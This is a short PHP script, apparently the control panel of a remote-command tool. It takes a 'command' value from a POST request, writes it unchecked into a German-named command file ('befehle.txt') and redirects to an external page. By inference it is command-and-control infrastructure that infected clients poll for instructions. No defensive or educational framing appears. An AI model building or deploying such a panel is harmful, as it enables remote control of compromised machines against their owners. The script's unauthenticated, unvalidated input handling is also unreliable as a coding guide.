<?php
/* Control.php version 1.33.7 */
# KONFIGURATION START

 $dateiname = "befehle.txt";
 
#KONFIGURATION ENDE

$befehl = $_POST['command'];

$datei = fopen($dateiname, "w");

	       fputs($datei, $befehl);
	    fclose($datei);
		
		header("Location: http://www.perforin.coderz-heaven.de/Wordlists/befehle.html");
	  
?>	